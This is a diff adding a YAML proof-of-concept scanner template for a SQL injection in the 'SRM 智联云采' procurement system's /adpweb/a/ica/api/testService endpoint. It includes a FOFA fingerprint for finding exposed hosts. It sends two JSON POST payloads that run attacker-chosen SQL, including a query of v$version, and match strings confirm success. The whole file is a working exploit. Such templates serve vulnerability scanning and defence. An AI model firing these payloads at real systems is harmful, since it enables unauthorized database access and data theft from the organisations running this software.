@@ -1,0 +1,32 @@
+id: poc-yaml-srm-testservice-sqli
+info:
+  name: SRM智联云采系统 testService SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: srm
+  fofa: title=="SRM 2.0"
+requests:
+- method: POST
+  path: /adpweb/a/ica/api/testService
+  headers:
+    Content-Type: application/json
+  data: "{\n \"dbId\": \"1001\",\n \"dbSql\": \"#set ($lang = $lang) SELECT * FROM\"\
+    ,\n \"responeTemplate\": \"{\\\"std_data\\\": {\\\"execution\\\": {\\\"sqlcode\\\
+    \": \\\"$execution.sqlcode\\\", \\\"description\\\": \\\"$execution.description\\\
+    \"}}}\",\n\"serviceCode\": \"q\",\n\"serviceName\": \"q\",\n\"serviceParams\"\
+    : \"{\\\"lang\\\":\\\"zh_CN\\\"}\"\n}"
+  expression: status_code == 200 && contains(body,"服务器内部异常，请联系管理员") && contains(body,"sqlcode")
+    && contains(body,"invalid table name")
+- method: POST
+  path: /adpweb/a/ica/api/testService
+  headers:
+    Content-Type: application/json
+  data: "{\n \"dbId\": \"1001\",\n \"dbSql\": \"#set ($lang = $lang) SELECT * FROM\
+    \ v$version\",\n \"responeTemplate\": \"{\\\"std_data\\\": {\\\"execution\\\"\
+    : {\\\"sqlcode\\\": \\\"$execution.sqlcode\\\", \\\"description\\\": \\\"$execution.description\\\
+    \"}}}\",\n\"serviceCode\": \"q\",\n\"serviceName\": \"q\",\n\"serviceParams\"\
+    : \"{\\\"lang\\\":\\\"zh_CN\\\"}\"\n}"
+  expression: status_code == 200 && contains(body,"执行成功")
+variables: {}
+transport: http
